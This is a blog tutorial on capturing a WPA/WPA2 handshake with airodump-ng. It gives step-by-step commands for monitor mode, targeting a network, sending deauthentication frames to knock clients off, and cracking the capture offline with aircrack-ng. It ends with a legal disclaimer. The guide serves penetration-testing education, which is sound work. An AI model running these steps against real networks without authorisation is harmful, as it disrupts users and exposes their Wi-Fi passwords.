---
title: "How to Capture a WPA/WPA2 Handshake using Airodump-ng"
date: 2025-04-06T18:00:00+05:30
categories: ["Wireless Hacking"]
tags: ["airodump-ng", "Wi-Fi", "handshake", "penetration testing"]
author: "Me"
showToc: true
TocOpen: true
draft: false
description: "A step-by-step guide to capturing WPA/WPA2 handshakes using airodump-ng for Wi-Fi penetration testing."
cover:
  image: "/images/handshake-capture.jpg"
  alt: "Wi-Fi Handshake Capture"
  caption: "Capturing WPA2 Handshake with Airodump-ng"
  hidden: false
---

Capturing a **WPA/WPA2 handshake** is a critical step in wireless penetration testing. This handshake can later be used to **crack the Wi-Fi password offline** using tools like Hashcat or John the Ripper. In this blog post, we’ll walk through the steps to capture a handshake using `airodump-ng`.

---

## 🧠 What is a Handshake?

A **4-way handshake** is part of the WPA/WPA2 authentication process. When a client connects (or reconnects) to a network, it exchanges this handshake with the access point. If we capture this exchange, we can use it to try and crack the Wi-Fi password.

---

## 🛠️ Tools Required

- A Linux machine (Kali Linux recommended)
- A Wi-Fi adapter that supports **monitor mode** and **packet injection**
- Aircrack-ng suite (already installed in Kali)

---

## ⚙️ Step-by-Step Guide

### 1. Put the Adapter in Monitor Mode

First, identify your wireless interface:

```bash
iwconfig
```

Let’s say your interface is `wlan0`. Put it into monitor mode:

```bash
airmon-ng start wlan0
```

This usually creates a new interface like `wlan0mon`.

---

### 2. Scan for Available Wi-Fi Networks

Now use `airodump-ng` to scan for Wi-Fi networks:

```bash
airodump-ng wlan0mon
```

You’ll see a list of nearby networks and connected clients.

**Note down the following of your target network:**

- **BSSID** (MAC address of the router)
- **Channel (CH)**
- **ESSID** (network name)

---

### 3. Focus on the Target Network

Use the BSSID and channel to filter out only the target network and capture the handshake:

```bash
airodump-ng -c <channel> --bssid <BSSID> -w handshake wlan0mon
```

> Replace `<channel>` and `<BSSID>` with your target’s values. The `-w handshake` flag tells it to write output to files prefixed `handshake`.

Let it run... but nothing will be captured unless a client connects or reconnects.

---

### 4. Kick a Client (Optional but Effective)

To force a client to reconnect and trigger a handshake, send a **deauthentication** packet:

```bash
aireplay-ng --deauth 10 -a <BSSID> -c <client MAC> wlan0mon
```

- `-a` = AP BSSID
- `-c` = client MAC address

If you don’t specify `-c`, all clients will be deauthed.

> This only works if there’s an active client. Wait and watch the `airodump-ng` window for a handshake capture in the top-right.

---

### 5. Verify the Handshake

Once captured, you’ll see something like:

```
WPA handshake: [BSSID]
```

The handshake file will be saved as `handshake.cap`. You can now use this file for offline cracking.

---

## 🧪 What’s Next?

Once you have the `.cap` file, you can try cracking it:

```bash
aircrack-ng handshake.cap -w /path/to/wordlist.txt
```

Or use **Hashcat** for GPU-based cracking.

---

## ⚠️ Legal Disclaimer

This guide is for **educational and ethical hacking purposes only**. Always get **explicit permission** before testing any network. Unauthorized access to networks is illegal and unethical.

---

## ✅ Conclusion

Capturing a WPA/WPA2 handshake with `airodump-ng` is one of the first steps in learning **Wi-Fi penetration testing**. Once you’ve mastered this, you’re ready to explore advanced attacks like Evil Twin, PMKID cracking, and more.

Happy hacking! 🧑‍💻

---

Got any questions or want me to cover handshake cracking with Hashcat next? Drop a comment below or connect with me on [GitHub](https://github.com/)!
